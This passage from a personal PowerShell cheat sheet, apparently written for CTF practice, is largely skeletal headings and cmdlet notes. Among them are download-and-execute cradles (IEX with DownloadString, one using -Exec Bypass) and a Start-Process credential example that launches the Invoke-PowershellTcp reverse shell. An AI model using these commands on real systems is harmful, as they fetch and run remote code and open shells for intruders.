				F. Conversion to Decimal:
				G. Conversion to Object:
				H. Conversion to String:
				I. Conversion to Array:
				J. Conversion to XML:
				K. Conversion to Regex:
					1. Object is converted to type string and then into an XML Document object of type xml.
				L. Conversion to Enumeration types:
				M. Conversion to other reference types:
				N. Conversion from String to Numeric type:
		Constrained Variables:
			Basics:
				'Constrained Variable' simply means constraining/fixing datatype of a variable at time of its creation.
				Syntax:
					[data_type]$var_name = value
			Example:
				[int]$i = 10
				$i = "0x10" #correct
				$i = "hello" #incorrect as cannot convert string to int
	Accessing Variables:
		Basics:
			$var_name => It prints value of variable to console
		Get-Variable:
			Basics:
			Usage:
				Flags:
		Important Variable Methods:
			$var_name.Length:
	Modifying Variable:
		Basics:
		Set-Item:
			Read 'Item Management' Sub-Section of 'Providers, Drives & Item Management' Section.
		Emptying Variable:
			Assigning $null to variable:
				$var_name = $null => This changes value of variable to $null, thus making it empty, value-less.
	Deleting Variable:
		Basics:
		Remove-Item:
			Read 'Item Management' Sub-Section of 'Providers, Drives & Item Management' Section.
		Remove-Variable:
			Basics:
			Usage:
				Flags:
					-Name <var_name_without_$> => 
					-Path <> => 
		Clear-Variable:
			Basics:
			Usage:
				Flags:
					-Name <var_name_without_$> => 
	Scope Management:
		Basics:
Class Management:
	Basics:
Object Management:
	Basics:
		Read 'Basic Theory' Section above.
	Creating Objects:
		Creating Instance of Objects:
			As stated in 'Basics' above, in powershell, everthing is an object. It means, variables, functions, cmdlets, output of cmdlets, etc all are objects.
		Creating New Objects:
			New-Object:
				Basics:
				Usage:
					Flags:
	Removing Objects:
		Read 'Item Management' Sub-Section of 'Providers, Drives & Item Management' Section.
	Compare-Object:
		Basics:
			Its used to compare two sets of objects, where one set of objects is called reference, and the other one is called difference.
		Usage:
			Compare-Object -ReferenceObject <> -DifferenceObject <> => Show difference
			Flags:
				-ReferenceObject <> => Object1
				-DifferenceObject <> => Object2
				-ExcludeDifferent => Output common lines instead of difference
	ForEach-Object:
		Read 'PS Loops & Conditionals' Section.
	Sort-Object:
		Basics:
			Its used to sort objects by property values.
		Usage:
			Syntax:
			Flags:
				-Descending
	Group-Object:
		Basics:
		Usage:
			Flags:
	Filtering/Greping/Manipulating Output:
		Select-Object:
			Basics:
				Its used to select\output\return object or set of objects or object properties.
				Its kind of like grep.
			Usage:
				Get-Process | Select-Object -Property ProcessName, Id, WS => Only show specified objects/columns in output
				$x | Select-Object -Unique => Select only unique elements from the given array/object($x)
				Syntax:
					Way-1:
						Way-1a:
							<cmdlet> | Select-Object
						Way-1b:
							$x | Select-Object => 'x' is an object
					Way-2:
						Way-2a:
							Select-Object -InputObject <cmdlet>
						Way-2b:
							Select-Object -InputObject $x => 'x' is an object
				Flags:
					-Index <x> => Select only those rows whose index is specified. It can take number, numbers or range as input.
					-First <x> => Select only first 'x' number of elements from given array/object
					-Last <x> => Select only last 'x' number of elements from given array/object
					-skip <x> => Skip first 'x' number of elements from given array/object
					-Unique => Select only unique elements from the given array/object
					-Property <> => Only show specified properties of the object
					-ExpandedProperty <> => 
		Where-Object:
			Basics:
				Its used to filter out output from a command.
				It allows you to construct a condition that returns either True or False and depending on the result of that condition, the cmdlet then either returns the output or does not.
			Usage:
				Way-1:(Using ScriptBlock)
					Syntax:
						<Cmdlet> | Where-Object -FilterScript {Scriptblock}
						<Cmdlet> | Where-Object -FilterScript {$_.<Property_name> <Operator> <Comparison_Value>}
						<Cmdlet> | Where-Object -FilterScript {($_.<Prop1> <Opt> <V1>) <Opt> ($_.<Prop2> <Opt> <V2>)}
					Example:
						Get-Process | Where-Object {($_.CPU -gt 2.0) -and ($_.CPU -lt 10)}
						Get-Service | Where-Object { $_.DisplayName -match 'Windows'}
				Way-2:(Using only flags)
					Syntax:
						<Cmdlet> | Where-Object -Property <x> <Operator> <Comparison_Value>
					Example:
						Get-Service | Where-Object -Property StartType -EQ 'Automatic'
						Get-Service | Where-Object -Property Name -Contains 'BITS'
				Flags:
					-FilterScript => Filter based on scriptblock
					-Property <x> => Specifies the property whose values are to be compared
				Note:
					Read Basics Section above to read about operators
	Members Management:
		Accessing Members:
			Accessing Methods:(aka Invoking/Calling Methods)
				$<obj_name>.<Method_name>()
			Accessing Properties:
				$<obj_name>.<Property_name>
		GM:
			Basics:
				Its an alias for 'Get-Member'.
			Usage:
				Read 'Get-Member' Section below.
		Get-Member:
			Basics:
				Its used to get members of an object.
			Usage:
				Syntax:
					Way-1:
						Way-1a:
							<cmdlet> | Get-Member
						Way-1b:
							$x | Get-Member => 'x' is an object
					Way-2:
						Way-2a:
							Get-Member -InputObject <cmdlet>
						Way-2b:
							Get-Member -InputObject $x => 'x' is an object
				Flags:
					-Force => Show intrinsic members
					-MemberType <member_type> => Shows members of specified member type only
					-Name <member_name> => Shows info about specified member only
		Add-Member:
			Basics:
				It adds custom properties and methods to an instance of a PowerShell object.
			Usage:
				Flags:
					https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-member?view=powershell-7.2
Text Management:
	Encoding Management:
		Basics:
		$OutputEncoding:
			Basics:
			Usage:
		Get-Content:
			Get-Content file.txt -Encoding <x>
			Note:
				Read 'Printing Files/Output' Section for more information.
	Clipboard Management:
		Set-Clipboard:
			Basics:
			Usage:
				Set-Clipboard => Copy output to clipboard
				Flags:
	Confusion:
		Printing Files/Output:
			GC:
				Its an alias for 'Get-Content'
				Read 'Get-Content' Section.
			Cat:
				Its an alias for 'Get-Content'
				Read 'Get-Content' Section.
			Type:
				Its an alias for 'Get-Content'
				Read 'Get-Content' Section.
			Get-Content:
				Basics:
				Usage:
					Get-Content file.txt => Print file contents
					(Get-Content file.txt)[x] => Printing line at index 'x'
					(Get-Content file.txt).Count => Printing linecount
					Flags:
						-Path <> => File path
						-Raw => Ignores newline characters and return contents of a file in one string
						-TotalCount <x> => Read/Return only first 'x' lines
						-Tail <x> => Read/Return only last 'x' lines
						-stream <stream_name> => Returns contents of specified stream
						-Encoding <x> =>
							Values:(10)
								1. ASCII:
									7-bit ASCII
								2. BigEndianUnicode:
									UTF-16 using big-endian byte order
								3. BigEndianUTF32:
									UTF-32 using big-endian byte order
								4. OEM:
									Its the default encoding for MS-DOS and console programs
								5. Unicode:
									UTF-16 using little-endian byte order
								6. UTF7:
								7. UTF8:
								8. UTF8BOM:
									UTF-8 with Byte Order Mark
								9. UTF8NoBOM:
									UTF-8 without Byte Order Mark
								10. UTF32:
			More:
				Basics:
				Usage:
					cat file.txt | more
		Writing Files:
			Echo:
				Its an alias for 'Write-Output'.
				Read 'Write-Output' Section.
			Write:
				Its an alias for 'Write-Output'.
				Read 'Write-Output' Section.
			Write-Output:
				Basics:
				Usage:
					Flags:
			Write-Host:
				Basics:
				Usage:
					Flags:
			Write-Warning:
				Basics:
				Usage:
					Flags:
			Out-File:
				Basics:
				Usage:
					Flags:
						-Filepath
						-Append
			Out-GridView:
				Basics:
				Usage:
					Flags:
			Set-Content:
				Basics:
				Usage:
					Flags:
						-Path <x> => File Path
						-Value '' =>
			Add-Content:
				Basics:
				Usage:
					Flags:
						-Path <x> => File Path
						-Value "" =>
						-Stream <> =>
			Clear-Content:
				Read 'Item Management' Sub-Section of 'Providers, Drives & Item Management' Section.
			JSON-Specific:
				ConvertTo-Json:
					Basics:
					Usage:
						Flags:
				ConvertFrom-Json:
					Basics:
					Usage:
						Flags:
			HTML-Specific:
				ConvertTo-HTML:
					Basics:
					Usage:
						Flags:
	Reading Files/Input:
		Reading Input:
			Read-Host:
				Basics:
				Usage:
					$x = Read-Host "Enter a number"
					Flags:
	Word/Line Count:
		Get-Content:
			Way-1:
				$x = Get-Content file.txt
				$x.Count => Wordcount
			Way-2:
				(Get-Content file.txt).Count
			Note:
				Read 'Get-Content' Section for more information.
	CSV Management:
		Import-CSV:
			Basics:
			Usage:
				Flags:
		Export-CSV:
			Basics:
			Usage:
				Flags:
					-Path
		ConvertTo-Csv:
			Basics:
			Usage:
				Flags:
		ConvertFrom-Csv:
			Basics:
			Usage:
				Flags:
	Formatting Files/Output:
		FL:
			Its an alias for 'Format-List'.
			Read 'Format-List' Section.
		Format-List:
			Basics:
			Usage:
				Flags:
					-Property <> => 
		Sort:
			Its an alias for Sort-Object.
			Read 'Sort-Object' Section.
	ClearScreen Management:
		Cls:
			Its an alias for Clear-Host
			Read 'Clear-Host' Section.
		Clear:
			Its an alias for Clear-Host
			Read 'Clear-Host' Section.
		Clear-Host:
			Basics:
			Usage:
				Flags:
	Replace:
		Basics:
		Usage:
			Flags:
	Select-String:
		Basics:
		Usage:
			Flags:
	Search-String:
		Basics:
		Usage:
			Flags:
	Text Editors:
File & Directory Management:
	Permission & Ownership Management:
		Note:
			I feel that its important to have prior understanding of Management of Linux Users and Groups to develop a better understanding of Permissions & Ownership of a file/directory. So, i have shifted this section to Users & Groups Management section.
			So, Read Users & Groups Management Section to read about Permission & Ownership Management.
	Basic Operations:
		Accesing files having space in their name:
		Location Management:
			Read 'Moving around in drive' Sub-Section of 'Drive Management' Sub-Section of 'Providers, Drives & Item Management' Section.
		Copying/Moving/Creating/Renaming/Removing Files:
			Read 'Item Management' Sub-Section of 'Providers, Drives & Item Management' Section.
		Listing Files:
			Dir:
				Its an alias for 'Get-ChildItem'
				Read 'Get-ChildItem' Section.
			LS:
				Its an alias for 'Get-ChildItem'
				Read 'Get-ChildItem' Section.
			GCI:
				Its an alias for 'Get-ChildItem'.
				Read 'Get-ChildItem' Section.
			Get-ChildItem:
				Basics:
				Usage:
					Get-ChildItem => To show folders and files
					Flags:
						-Force => Show hidden also
						-Rec => recursive
		Test-Path:
			Basics:
				Its used to test if the specified directory exists. It returns $true if it exists, otherwise $false.
			Usage:
				Test-Path <path>
	ADS Mangement:(Alternate Data Streams)
	Finding Files & Directories:
	Downloading Files:
		Inbuilt Methods:
			powershell -c (New-Object Net.WebClient).DownloadFile('http://ip/filename', 'savename')
			IEX:
				Basics:
				Usage:
					powershell IEX(New-Object Net.WebClient).downloadstring('http://ip:port/filename')
					Flags:
			IWR:
				Basics:
				Usage:
					Flags:
		Wget:
			Basics:
			Usage:
				Flags:
		cURL:
			Read WebApp Pentesting For CTF Sheet to know about cURL.
		Note:
			As far as "Forensics" are concerned, we should use Wget instead of cURL to download files as cURL has a major issue of changing "Origin Date" header to current date in meta-data of a file.
			To test this, we can download any webpage via both Wget and cURL and use exif on them.
Archive Management:
	Basics:
	Archive Specific:
		Zip:
			Compress-Archive:
				Basics:
					Its used to create a zip file from specified files and directories.
				Usage:
					Way-1:
						$x = @{
						 Path = "File1_Location", "File2_Location"
						 CompressionLevel = "<Compression_Level>"
						 DestinationPath = "file.zip"
						}
						Compress-Archive @x
					Way-2:(Using Flags)
						Flags:
							-Path <> => Directory/File Location
							-DestinationPath <> => Zip Location
							-CompressionLevel "<Compression_Level>" => Compression level of archive
								Values:(3)
									A. NoCompression:
									B. Optimal:(Default Value)
									C. Fastest:
			Expand-Archive:
				Basics:
					Its used to uncompress zip files.
				Usage:
					Flags:
						-Path <> => Zip Location
						-DestinationPath <> => Directory/File Location
Users & Group Management:
	Basics:
		Users:
		Groups:
		Configuration Files:
	User Management:
		Creating Users:
		Deleting Users:
		Locking Users:
		Disabling Users:
		Editing User Attributes:
			Password Management:
		Checking User Information:
		Get-LocalUser:
			Basics:
			Usage:
				Flags:
					-Name username => show all info about a user
					-SID "sid_value" => find user having the given SID
	Group Management:
		Get-LocalGroup:
			Basics:
			Usage:
				Flags:
	Admin Accounts & Group Management:
	Running Commands/Shell as another user/admin:
		Execute command as another user in Powershell:
			Method-1:
				Here, we will execute script.ps1 as the user we want to get shell as
				$pass = ConvertTo-SecureString 'password' -AsPlainText -Force
					it creates a variable storing pass
				$cred = New-Object System.Management.Automation.PSCredential('username',$pass)
					it creates a username-pass pair
				Start-Process -FilePath "powershell" -ArgumentList "http://ip/Invoke-PowershellTcp.ps1" -Credential $cred
					it will run a command on behalf of user_name using $cred
	Permission & Ownership Management:
		Basics:
		Listing Permissions/Ownership/Groups:
		Changing Permissions/Ownership/Groups:
Network Management:
	Basics:
	Interface Management:
	Internet Management:
	Ping:
		Basics:
		Usage:
			Flags:
	Test-Connection:
		Basics:
		Usage:
			Flags:
				-ComputerName <> => 
				-Count <> => 
				-Quiet => 
	Route:
		Basics:
		Usage:
			Flags:
	Netstat:
		Basics:
		Usage:
			Flags:
	Arp:
		Basics:
		Usage:
			Flags:
	Get-NetIPAddress:
		Basics:
		Usage:
			Flags:
	Get-NetTCPConnection:
		Basics:
		Usage:
			Flags:
	MailBox Management:
		Set-Mailbox:
			Basics:
			Usage:
				Flags:
	VPN Management:
	TOR Management:
	Firewall Management:
Remote Management:
	CLI:
		SSH:
		WinRM:
		WSMAN:
		PS Remoting:
	GUI:
		RDP:
Process, Thread, Job & Signal Management:
	Basics:
		Terms:
			Background:
			Foreground:
		Process Identifiers:
		Signals:
		Note for self:
			Write about Background operator(&) here.
				https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_operators?view=powershell-7.2#background-operator-
	Process Management:
		Process Monitoring:
			PS:(Process Status)
				Its an alias of 'Get-Process'.
				Read 'Get-Process' Section below.
			GPS:
				Its an alias of 'Get-Process'.
				Read 'Get-Process' Section below.
			Get-Process:
				Basics:
					It returns a point-in-time snapshot of a system’s running process information.
				Usage:
					Flags:
						-Name <process_name> =>
						-IncludeUserName => Shows username of user running a process in output
		Starting Processes:
			Start-Process:
				Basics:
				Usage:
					Start-Process file.exe
					Flags:
						-Name <process_name> => Name of the process to start
		Terminating Processes:
			Stop-Process:
				Basics:
				Usage:
					Stop-Process -Name <process_name>
					Flags:
						-Name <process_name> => Name of the process to stop.
		Suspending Processes:
	Job Control & Management:
		Recieve-Job:
			Basics:
			Usage:
				Flags:
					-Wait => 
		Starting Jobs:
			Start-Job:
				Basics:
				Usage:
					Flags:
		Terminating Jobs:
			Remove-Job:
				Basics:
				Usage:
					Flags:
		Suspending Jobs:
	Signal Management:
Service Management:
	Basics:
	Get-Service:
		Basics:
		Usage:
			Flags:
				-Name <> => 
	Start-Service:
		Basics:
		Usage:
			Flags:
	Stop-Service:
		Basics:
		Usage:
			Flags:
				-PassThru => 
	Resume-Service:
		Basics:
		Usage:
			Flags:
	Restart-Service:
		Basics:
		Usage:
			Flags:
Registry Management:
	Get-Acl:
		Basics:
		Usage:
			Flags:
				-Path <> => 
System Management:
	Basics:
	Kernel Management:
	System Details:
		Hostname Management:
			Changing Hostname:
		Time Management:
			Get-Date:
				Basics:
				Usage:
					Flags:
		Sleep Management:
			Start-Sleep:
				Basics:
				Usage:
					Flags:
		Reboot:
		Shutdown:
Shell & Terminal Management:
	Basics:
	Environment Management:
		Shell Functions:
		Variable Management:
			Set-Variable:
			Alias Management:
				Basics:
					Alias is an alternate name for a command/function/script/File.
					Alias is a string that links to a command and is executable.
				New-Alias:
					Basics:
						Its used to create new alias for current powershell session, ie, temporarily only.
					Usage:
						New-Alias -Name <alias_name> -Value <cmdlet> => Created a new alias
						New-Alias -Name <alias_name> <cmdlet> => Created a new alias
						Flags:
							-Name <alias_name> => Alias name
							-Value <cmdlet/file/executable> => File/Cmdlet whose alias is being created
							-Description <> => Alias description/comment
							-Force => Its used in case if alias already exists. In such case, it acts like 'Set-Alias'.
				Set-Alias:
					Basics:
						It used to create/modify alias the current powershell session.
					Usage:
						Set-Alias -Name <alias_name> -Value <cmdlet> => If alias dont exist, then it creates a new alias else, modifies it.
						Flags:
							-Name <alias_name> => Alias name
							-Value <cmdlet/file/executable> => File/Cmdlet whose alias is being created
				Export-Alias:
					Basics:
						It exports all alias in current session to a file
					Usage:
						Export-Alias -Path "filename.ext"
						Export-Alias -Path "filename.ext" -Append -Force => Append alias into an existing file
						Flags:
							-Path "filename.ext" => Path of file to save alias in
							-Appen => Append alias into an existing file
							-as <x> => file format, value of x:
								Csv => Default value
								Script => .ps1 script
							Note:
								Extension must be same as value passed to '-as' parameter
				Import-Alias:
					Basics:
						To import aliases from the specified file.
					Usage:
						Import-Alias file.ext => Import aliases from file.ext
						Import-Alias -Path file.ext => Import aliases from file.ext
						Flags:
							-Path <file.ext> => Path of file to get aliases from
				Get-Alias:
					Basics:
						Gets the aliases for the current session.
					Usage:
						Get-Alias => Print all aliases and their respective cmdlet
						Get-Alias -Name <alias_name> => Print cmdlet of specified alias only
						Get-Alias -Definition <cmdlet> => Print all alias which exists for the given cmdlet
						Flags:
							-Name <alias_name> => Print cmdlet of specified alias only
							-Definition <cmdlet> => Print all alias which exists for the given cmdlet
							-Exclude <> => Exclude specified alias
				Note:
					In order to somehow make new aliases permanent, we can push them in a csv file using 'Export-Alias' cmdlet and then at start of every session, import new alias using 'Import-Alias' cmdlet.
			Enviroment Variables:
	Shell Management:
		Basics:
		Shell Information:
			To know if shell is 64-bit or 32-bit:
				[Enviroment]::Is64BitOperatingSystem:
					Basics:
					Usage:
						If value is True => 64-bit.
				[Enviroment]::Is64BitProcess:
					Basics:
					Usage:
						If value is True => 64-bit.
				Note:
					By default, on a 64-bit windows, a 64-bit powershell runs.
			$PSVersionTable:
				Basics:
					It prints information about current shell.
				Usage:
					$PSVersionTable => It prints information about shell
					$PSVersionTable.<Property_Name> => Prints information about specified column only
		History Mangement:
			Basics:
				History File:
			Get-History:
				Basics:
					Prints history of current powershell session. Each line has a ID.
				Usage:
					Flags:
			Invoke-History:
				Basics:
					Its used to execute a command from history
				Usage:
					Invoke-History -Id <x>
					Flags:
						-Id <x> => Executes command having 'x' Id in history.
			Add-History:
				Basics:
				Usage:
					Flags:
			Clear-History:
				Basics:
					Its used to delete command history from current session.
				Usage:
					Flags:
		Shell Binaries:
			Powershell.exe:
				Basics:
					Read Basics Section at the top.
				Usage:
					powershell.exe => Launches a shell instance
					powershell => Launches a shell instance
					powershell -Exec Bypass IEX(New-Object Net.WebClient).DownloadString('http://ip/file.ps1')
					Flags:
						-version <> => Launches specified version powershell shell
						-c "<>" => -command "<command>" => Runs the specified command
						-ep <> => -ExecutionPolicy <> => -Exec <execution_policy_to_apply>
						-f <> =>
						-w <> => -windowstyle <> => 
						-enc <> => 
						-nop => -noprofile => 
						-nol => 
						-noni => 
						-noexit => 
	Terminal Management:
		Terminal Shortcuts:
		Terminal Art:	
Server Management:
	Basics:
	RSAT:(Remote Server Administration Tools)
WSL Management:(Windows Subsystem for Linux)
	Basics:
Virtualization Management:
	.VHD:
		Basics:
Scheduled Task Management:
	Basics:
	Scheduled Tasks:
		Get-ScheduleTask:
			Basics:
			Usage:
				Flags:
					-TaskName => takes taskname
Device Management:
	Basics:
	Device-Based Management:
		Disk Management:
			Basics:
		GPU Management:
		CPU Management:
		Memory Management:
			Basics:
			SWAP Management:
			RAM Management:
			Virtual Memory Management:
Package Management:
	Basics:
		PSSnapin:(aka Powershell Snap-Ins)
			They are deprecated now.
	Powershell Modules:
		Basics:
			Module is a package that contains powershell commands in the form of functions, cmdlets and workflows, in addition it may contain variables, aliases and providers. Modules can be written in PowerShell and/or compiled as DLLs.
		Repository Management:
			Basics:
				Types:
					Registered Repository:
				Note:
					'https://www.powershellgallery.com' is a registered repository.
			Get-PSRepository:
				Basics:
				Usage:
					Flags:
		Module Management:
			Install-Module:
				Basics:
					Its used to download and install one or more modules from an online repository.
				Usage:
					Flags:
						-Name <module_name> => PS Module to install. For more than one module, use comma.
						-MinimumVersion <x> => It specifies the lowest version of the module that should be installed
						-RequiredVersion <x> => It specifies to install the specified version only
						-Scope <x> => Who to install module for.
							Values:(2)
								A. CurrentUser
								B. AllUsers
			Find-Module:
				Basics:
				Usage:
					Flags:
						-Name <module_name> => 
			Import-Module:
				Basics:
				Usage:
					Flags:
						-Name <module_name> => PS Module to import
			New-Module:
				Basics:
					It creates a new dynamic module that exists only in memory.
				Usage:
					https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-module?view=powershell-7.2
					Flags:
			Get-Module:
				Basics:
				Usage:
					Flags:
						-All => Prints all modules loaded in the current powershell session
						-Name <module_name> => Shows all info about the specified module
						-ListAvailable => 
			Remove-Module:
				Basics:
				Usage:
					Flags:
						-Name <module_name> => Name of module to remove
		Module-Specific CmdLets:
			ActiveDirectory:
				Basics:
					It has a total of 147 CmdLets.
				Important CmdLets:
					Get-ADUser:
						Basics:
						Usage:
							Flags:
								-Identity <> => 
								-Properties <> => 
					Get-ADGroup:
						Basics:
						Usage:
							Flags:
								-Properties <> => 
						
						Basics:
						Usage:
							Flags:
	Chocolatey:
		Basics:
PowerShell Command Management:
	Grouping Powershell commands:
		Basics:
		Syntax:
			command1;command2
	Invoke-Command:
		Basics:
		Usage:
			Flags:
				-ScriptBlock <scriptblock> => 
